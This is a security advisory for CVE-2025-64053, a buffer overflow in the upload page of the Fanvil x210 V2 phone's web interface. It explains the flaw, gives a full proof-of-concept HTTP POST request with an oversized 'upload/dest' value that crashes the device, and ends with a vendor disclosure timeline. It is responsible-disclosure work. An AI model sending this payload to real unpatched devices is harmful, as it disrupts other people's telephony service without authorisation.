# Buffer overflow in upload page (CVE-2025-64053)
## Summary
A Buffer overflow vulnerability on Fanvil x210 device has been found during an analysis on the last firmware version `X210-V2-2.12.20`. The request `/cgi-bin/webconfig?page=upload&action=submit` does not properly handle the length of the POST parameter `upload/dest`, allowing attacker with access to the web interface to cause denial of service or in the worst case execute arbitrary commands.

## Affected products
- Fanvil x210 V2, firmware V2.12.20

## Details
The POST parameter `upload/dest` is obtained from a dropdown menu contained inside the **Upload File** page on web UI and it is easily editable. This parameter is sent against the `/cgi-bin/webconfig?page=upload&action=submit` path and the CGI script that handles it does not check its length. So, it is possible to send a payload of at least 704 characters to cause a denial of service condition.

## PoC
```http
POST /cgi-bin/webconfig?page=upload&action=submit HTTP/1.1
Host: 192.168.1.62:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,it;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.1.62:8081/cgi-bin/webconfig?page=upload&action=submit
Content-Type: multipart/form-data; boundary=----geckoformboundary6a02b0d7d1bcccc95453648f7f756e21
Content-Length: 1057
Origin: http://192.168.1.62:8081
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=4

------geckoformboundary6a02b0d7d1bcccc95453648f7f756e21
Content-Disposition: form-data; name="upload/newfile"; filename="test.xst"
Content-Type: application/octet-stream

test

------geckoformboundary6a02b0d7d1bcccc95453648f7f756e21
Content-Disposition: form-data; name="upload/dest"

/userdata/resource/lang/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
------geckoformboundary6a02b0d7d1bcccc95453648f7f756e21--
```

![](./img/bof_upload.png)

![](./img/bof_sisegv.png)

## Additional information
Issue fixed on firmware version 2.12.22.2

## Credits
Spike Reply Cybersecurity Team

## Disclosure timeline
- 01/03/2025: Vulnerability discovered
- 04/03/2025: Initial contact with vendor
- 06/03/2025: Technical details shared with vendor
- 25/04/2025: Disclosure date agreed with vendor (June 6, 2025)
- 14/05/2025: Vendor reports inability to reproduce this and other reported issues
- 06/06/2025: Team informs vendor they are retesting on firmware v2.12.22.2, released after initial contact (April 28, 2025)
- 09/06/2025: Vendor investigates whether web server changes in new firmware address the issues
- 25/06/2025: Team requests update - no response
- 07/07/2025: Follow-up request sent - still no response
- 16/07/2025: Team sends another follow-up and sets new disclosure date (July 28, 2025) - no response
- 25/11/2025: Disclosure
